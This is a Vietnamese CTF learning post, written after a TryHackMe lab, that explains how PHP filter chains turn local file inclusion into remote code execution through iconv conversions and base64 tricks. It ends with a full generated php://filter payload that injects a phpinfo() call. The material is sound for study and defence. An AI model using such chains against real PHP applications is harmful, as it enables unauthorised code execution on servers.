---
tags:
  - learning
  - ctf
  - pentest
title: PHP Filter Chain
post-date: 02-03-2025
update-date: 
category: learning
aliases:
---
> Bài viết được tham khảo từ https://hackmd.io/@endy/Skxms9eW2 của tác giả **endy**, xin cảm ơn tiền bối vì đã có những bài viết thực sự chất lượng cho thế hệ sau như em.
# Giới thiệu
![[Pasted image 20250302230330.png]]
Đối với mình việc tạo attack chain để nâng tầm lỗ hổng chưa bao giờ là đơn giản. Chẳng có gì có thể làm bạn cay hơn việc nghĩ mình đã làm được gì đó mà lại chẳng làm được gì. Đặc biệt là với LFI. Chẳng may hôm nay mình được thử sức với 1 lab của TryHackMe là **Cheese CTF**, thứ đã cho mình biết đến PHP Filter Chain, giúp từ LFI có thể dẫn tới RCE.

# Chuẩn bị trước khi ăn - Kiến thức cần biết
Liên quan tới PHP Filter Chain, ta phải tìm hiểu 3 vấn đề: **Hàm xử lý base64 trong PHP**, **Chuyển đổi giữa các bảng mã trong PHP** và **Prepended characters**.
## Chuyển đổi giữa các bảng mã trong PHP
Để chuyển đổi giữa các bảng mã trong PHP, ta sử dụng hàm `iconv`:
```bash
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo iconv('UTF-8', 'ISO-8859-1//TRANSLIT', 'Euro €.');" 
Euro EUR.   
```
Ngoài ra ta cũng có thể sử dụng wrapper `convert.iconv.[bảng mã gốc].[bảng mã chuyển]`:
```bash
┌──(t6d㉿t6d)-[~]
└─$ echo "Euro €." > test.txt 
php -r "echo file_get_contents('php://filter/convert.iconv.utf-8.utf-7/resource=test.txt');" 
Euro +IKw.
```
## Xử lý base64 trong PHP
Trong PHP, có 2 cách để decode base64 là `base64_decode` và `convert.base64-decode`. Thông thường thì chúng sẽ có cách hoạt động như nhau:
```bash
┌──(t6d㉿t6d)-[~]
└─$ php -r 'echo base64_encode("t6d");'   
dDZk                                                                                
┌──(t6d㉿t6d)-[~]
└─$ php -r 'echo base64_decode("dDZk");'
t6d                                                                                
┌──(t6d㉿t6d)-[~]
└─$ echo "dDZk" > test.txt              
                                                                                
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
t6d         
```
Nếu ta thêm vài ký tự không có trong tập của base64 vào ciphertext thì cả 2 hàm đều tự động loại bỏ các ký tự đó.
```bash
┌──(t6d㉿t6d)-[~]
└─$ echo "dDZk@@" > test.txt                                                                                                                                                                                                                
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
t6d                                                                                                                                                                                                                                      
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo base64_decode('dDZk@@')"                                                    

┌──(t6d㉿t6d)-[~]
└─$ php -r "echo base64_decode('dDZk@@');"
t6d   
```
Nhưng kỳ lạ thay, nếu thêm dấu `=` thì mọi chuyện lại khác, cụ thể thì:
```bash
┌──(t6d㉿t6d)-[~]
└─$ echo "dDZk==" > test.txt
                                                                                                                                                                                                                                              
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo base64_decode('dDZk==');"
t6d                                                                                                                                                                                                                                              
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo base64_decode('dDZk==');"
t6d                                                                                                                                                                                                                          
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
PHP Warning:  file_get_contents(): Stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1
```
Với `base64_decode` thì mọi thứ bình thường như với `convert.base64-decode`thì sẽ gây ra lỗi.
Để xử lý vấn đề này, ta sẽ chuyển dấu `=` từ `UTF-8` sang `UTF-7` bằng `iconv`:
```bash
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test.txt');"
t6d��� 
```
Câu hỏi là sao lại có mấy cái ký tự `�` thì câu trả lời là khi biến đổi từ `UTF-8` sang `UTF-7`, dấu `=` đã bị biến đổi thành mỗi chuỗi chứa ký tự không hợp lệ với Base64. Và như đã có nên lên ở trên, nếu là ký tự không hợp lệ, wrapper `convert.base64-decode` sẽ xóa nó, kết quả là nó bị biến đổi thành chuỗi ký tự không có nghĩa khi được decode:
```bash
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7/resource=test.txt');"
dDZk+AD0APQ
```
Như ví dụ ở trên thì ta thấy dấu `+` đã bị xóa đi và còn chuỗi `AD0APQ` khi decode sẽ được:
```bash
┌──(t6d㉿t6d)-[~]
└─$ echo "+AD0APQ" > test.txt                                                                                 
                                                                                                                                                
┌──(t6d㉿t6d)-[~]
└─$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');" 
���  
```
Quá trình biến đổi từ dấu `=` từ `UTF-8` sang `UTF-7` được biểu thị qua hình sau:
![[Pasted image 20250302235100.png]]
## Prepended characters
Một số bảng mã khi encode sẽ chèn thêm mội chuỗi vào trước text, hành động này được gọi prepended.
Một trong những ví dụ điển hình nhất đó chính là [Byte order mark (BOM)](https://en.wikipedia.org/wiki/Byte_order_mark). `BOM` tóm tắt là việc một chuỗi ký tự đặc biệt được chèn vào đầu của text khi encode, với mục đích như là [Magic number](https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files)của Unicode encoding, cho biết bảng mã nào đang được sử dụng, tránh việc decode sai.

| Encoding | Representation |
| :------: | :------------: |
|  UTF-7   |      +/v       |
|  UTF-8   |      ï»¿       |
|  UTF-16  |       þÿ       |
# Ăn cơm - Cách hoạt động của PHP Filter Chain
## Điều ta mong muốn
Điều ta mong muốn ở đây là thực thi được script của mình ở trong điều kiện:
```php
<?php file_get_contents($_GET['input']); ?>
```
## Tạo một ký tự theo ý muốn
Ở đây chúng ta sẽ có một ví dụ về việc tạo ra số `8`. Quy trình cụ thể như sau:
![[Pasted image 20250303101539.png]]
- Đầu tiên ta chuyển chuỗi `START` sang `UTF-16`, khi này ta được thêm prepended `/xff/xfe`.
- Tiếp tục chuyển qua bảng mã `LATIN6`, phần prepended được chuyển thành `ĸþ`. Việc chuyển đổi có thể xem bảng mã chuyển phía dưới, trong đó với ký tự `ĸ` với cột là `xF` và hàng là `Fx` được ghép thành `FF` và thêm biểu diễn `/x` ta có `/xff`.
![[Pasted image 20250303101337.png]]
- Khi này ta lại chuyển chuỗi về `UTF-16`, khi này ta được thêm prepended `/xff/xfe` kèm với ký tự `ĸ` được chuyển thành `/x01/x38`.
![[Pasted image 20250303101422.png]]
- Do để in ra thì phải chuyển lại ASCII hex nên khi in ra chuỗi ta có `/x38` là `8`
```php
<?php
$return = iconv( 'UTF8', 'UTF16', "START");
echo(bin2hex($return)."\n");
echo($return."\n");
$return2 = iconv( 'LATIN6', 'UTF16', $return);
echo(bin2hex($return2)."\n");
echo($return2."\n");
?>
```

```bash
fffe53005400410052005400
��START
fffe3801fe005300000054000000410000005200000054000000
��8�START
```
## Loại bỏ các thành phần thừa
Đây là phần khá phức tạp, ta sẽ đơn giản hóa nó rằng ta sẽ sử dụng việc encode decode base64 để xóa các ký tự không mong muốn. Dưới đây là quy trình để tạo ra ký tự `8`.
![[Pasted image 20250303105606.png]]
## Vấn đề đường dẫn hợp lệ
Khi sử dụng `include`, `require` hay `file_get_contents` thì ta cần có đường dẫn hợp lý. Để giải quyết cái này thì ta sử dụng wrapper `php://temp`
## Kết quả cuối cùng
Sau khi kết hợp lại tất cả các yếu tố trên, ta có script để sử dụng của [synacktiv](https://github.com/synacktiv/php_filter_chain_generator)
```bash
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
